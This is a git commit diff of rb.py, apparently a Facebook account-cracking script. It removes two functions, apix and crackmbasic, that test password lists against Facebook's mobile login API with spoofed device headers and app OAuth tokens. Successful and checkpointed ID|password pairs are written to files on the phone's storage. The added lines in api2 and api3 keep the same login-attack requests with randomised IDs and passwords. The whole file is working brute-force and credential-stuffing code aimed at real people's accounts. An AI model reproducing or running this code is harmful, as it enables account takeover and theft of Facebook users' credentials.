e104211ed052f5b702dc6ae7c2cfd0d15d300c54
rbrahul24 <119988259+rbrahul24@users.noreply.github.com>
2023-03-02 20:04:20 +0545

    Update rb.py

--- rb.py
+++ rb.py
@@ -442,75 +442,7 @@ def api(ids,names,passlist):
                         time.sleep(10)
                 except Exception as e:
                         pass    
-def apix(ids,passlist):
-                try:
-                        global ok,loop
-                        sys.stdout.write(f'\r\r\033[1;37m [SPY1x1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-                        for pas in passlist:
-                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
-                                application_version_code=str(random.randint(000000000,999999999))
-                                fbs=random.choice(fbks)
-                                xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
-                                gtt=random.choice(xxxxx)
-                                gttt=random.choice(xxxxx)
-                                android_version=str(random.randrange(6,13))
-                                ua_string = f'Davik/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
-                                device_id = str(uuid.uuid4())
-                                adid = str(uuid.uuid4())
-                                data = {"adid": "9e0f3002-43fc-4358-89f1-5622b403d502",
-                                        'email':ids,
-                                        'password':pas,
-                                        'cpl':'true',
-                                        'credentials_type':'device_based_login_password',
-                                        "source":"device_based_login",
-                                        'error_detail_type':'button_with_disabled',
-                                        'source':'login','format':'json',
-                                        'generate_session_cookies':'1',
-                                        'generate_analytics_claim':'1',
-                                        'generate_machine_id':'1',
-                                        "locale":"es_CU","client_country_code":"CU",
-                                        'device':gtt,
-                                        "device_id":"6e18861e-d578-4cfb-8728-528f1e4b90e7",
-                                        "method":"auth.login",
-                                        "fb_api_req_friendly_name": "authenticate",
-                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
-                                head = {
-                                        'content-type':'application/x-www-form-urlencoded',
-                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
-                                        'x-fb-connection-type':'unknown',
-                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                                        'User-Agent': 'Dalvik/2.1.0 Linux; U; Android 6.0.0; GT-I9300I Build/KTU84P) [FBAN/FB4A;FBAV/540.0.0.84.626;FBBV/169717250;FBDM/{density=4.0,width=1532,height=2560};FBLC/en_US;FBCR/Grameenphone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9300I;FBSV/6.0.0;FBCA/armeabi-v7a:armeabi;]',
-                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
-                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
-                                        'x-fb-connection-quality':'EXCELLENT',
-                                        'x-fb-friendly-name':'authenticate',
-                                        'accept-encoding':'gzip, deflate',
-                                        'x-fb-http-engine':     'Liger'}
-                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
-                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
-                                q = json.loads(po)
-                                if 'session_key' in q:
-                                        print(f'\r\r\033[1;32m [RAHUL-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/RAHUL-OK.txt','a').write(ids+'|'+pas+'\n')
-                                        #cek_apk(session,coki)
-                                        oks.append(ids)
-                                        break
-                                elif 'www.facebook.com' in q['error']['message']:
-                                        if 'y' in pcp:
-                                                print(f'\r\r\x1b[38;5;126m [RAHUL-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open(f'/sdcard/RAHUL-CP.txt', 'a').write(ids+'|'+pas+'\n')
-                                                cps.append(ids)
-                                                break
-                                        else:
-                                                open(f'/sdcard/RAHUL-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                break
-                                else:
-                                        continue
-                        loop+=1
-                except requests.exceptions.ConnectionError:
-                        time.sleep(10)
-                except Exception as e:
-                        pass
+
 def pak():
                 user=[]
                 clear()
@@ -692,8 +624,8 @@ def api2(ids,names,passlist):
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 data = {'adid':"9e0f3002-43fc-4358-89f1-5622b403d502",
-                                        'email':ids,
-                                        'password':pas,
+                                        'email':'10000'+str(random.randint(11111111111,99999999999)), 
+                                        'password':str(random.randint(1111111,9999999)),
                                         'cpl':'true',
                                         'credentials_type':'device_based_login_password',
                                         "source": "device_based_login",
@@ -710,12 +642,12 @@ def api2(ids,names,passlist):
                                         "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                 head = {
                                         'content-type':'application/x-www-form-urlencoded',
-                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
-                                        'x-fb-connection-type':'mobile.LTE',
+                                        'x-fb-sim-hni':'31061',
+                                        'x-fb-connection-type':'unknown',
                                         'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                         'user-agent':ua_string,
-                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
-                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
+                                        'x-fb-net-hni':'28613',
+                                        'x-fb-connection-bandwidth':'29643048',
                                         'x-fb-connection-quality':'EXCELLENT',
                                         'x-fb-friendly-name':'authenticate',
                                         'accept-encoding':'gzip, deflate',
@@ -760,11 +692,11 @@ def api3(ids,names,passlist):
                                 gttt=random.choice(xxxxx)
                                 android_version=str(random.randrange(6,13))
                                 ua_string = f'Davik/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
-                                device_id = str(uuid.uuid4())
+                                device_id = 'e66b2ae4-35b6-4c2b-822b-b57243edb930',
                                 adid = str(uuid.uuid4())
                                 data = {'adid':adid,
-                                        'email':ids,
-                                        'password':pas,
+                                        'email':'10000'+str(random.randint(11111111111,99999999999)),
+                                        'password':str(random.randint(1111111,9999999)),
                                         'cpl':'true',
                                         'credentials_type':'device_based_login_password',
                                         "source": "device_based_login",
@@ -775,18 +707,18 @@ def api3(ids,names,passlist):
                                         'generate_machine_id':'1',
                                         "locale":"es_CU","client_country_code":"CU",
                                         'device':gtt,
-                                        'device_id':adid,
+                                        'device_id':'e66b2ae4-35b6-4c2b-822b-b57243edb930',
                                         "method": "auth.login",
                                         "fb_api_req_friendly_name": "authenticate",
                                         "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                 head = {
                                         'content-type':'application/x-www-form-urlencoded',
-                                        'x-fb-sim-hni':"45201",
-                                        'x-fb-connection-type':'mobile.LTE',
+                                        'x-fb-sim-hni':"31061",
+                                        'x-fb-connection-type':'cell.CTRadioAccessTechnologyHSDPA',
                                         'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                         'user-agent':ua_string,
-                                        'x-fb-net-hni':"45204",
-                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
+                                        'x-fb-net-hni':"28613",
+                                        'x-fb-connection-bandwidth':'29643048',
                                         'x-fb-connection-quality':'EXCELLENT',
                                         'x-fb-friendly-name':'authenticate',
                                         'accept-encoding':'gzip, deflate',
@@ -816,41 +748,7 @@ def api3(ids,names,passlist):
                         time.sleep(10)
                 except Exception as e:
                         pass 
-def crackmbasic(ids,names,passlist):
-        global ok,cp,loop
-        sys.stdout.write(f'\r\r\033[1;37m [RAHUL-RB] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-        sys.stdout.flush()
-        for pw in pwv:
-                        ag = idf[::-1]
-                        head = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) Mobile/nFGZ6 [FBAN/FBIOS;FBDV/iPhone13,1;FBSN/iOS;FBSV/262.463.500;FBSS/2;FBID/iPhone;FBLC/en_US;FBOP/5;FBRV/0];', 'accept-encoding': 'gzip,deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authentication': 'OAuth 6628568379|c1e620fa708a1d5696fb991c1bde5662', 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell', 'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'content-type': 'application/x-www-form-urlencoded', 'x-fb-friendly_name': 'authenticate'}
-                        dataa = {'include_headers': 'False', 'decode_body_json': 'True', 'streamable_json_response': 'True', 'api_key': '6628568379', 'adid': 'C77d3d38Cf2CCab9', 'format': 'JSON', 'method': 'auth/login', 'email': idf, 'password': pw, 'credentials_type': 'password', 'error_detail_type': 'button_with_disabled', 'source': 'login', 'community_id': '0', 'currently_logged_in_userid': '0', 'meta_inf_fbmeta': 'NO_FILE', 'try_number': '1', 'attempt_login': 'true', 'return_multiple_errors': 'true', 'locale': 'en_US', 'client_country_code': 'en_US', 'access_token': '6628568379|c1e620fa708a1d5696fb991c1bde5662', 'server_timestamps': 'True', 'pretty': 'False', 'strip_defaults': 'True', 'strip_nulls': 'True', 'fb_api_caller_class': 'com.facebook.account.login.protocol.FbiosAuthHandler', 'fb_api_request_friendly_name': 'authenticate'}
-                        r = requests.post(f"https://graph.facebook.com/auth/login",headers=head,verify=True,data=dataa)
-                        ro = re.findall('uid": (.*?),',str(r.text))
-                        try:
-                                for roid in ro:
-                                        pass
-                        except:
-                                roid = idf
-                        if "www.facebook.com" in r.text:
-                                print(f'   \r {rp}[QSR-CP] {idf} | {pw}{s}')     
-                                open('/sdcard/qsr_cp.txt','a').write(roid+'|'+pw+'\n')
-                                akun.append(idf+'|'+pw)
-                                cp+=1
-                                break
-                        elif "session_key" in r.text:
-                                ok+=1
-                                print(f'   \r {rg}[QSR-OK] {roid} | {pw}{s}')
-                                open('/sdcard/qsr_ok.txt','a').write(roid+'|'+pw+'\n')
-                                break
-                        elif "SMS shortly" in r.text:
-                                print(f'   \r {rc}[QSR-2F] {idf} | {pw}{s}')
-                                open('/sdcard/qsr_2f.txt','a').write(roid+'|'+pw+'\n')
-                                break
-                        else:
-                                continue
-        loop+=1
 
-                        
 try:
         approval()
 except requests.exceptions.ConnectionError:
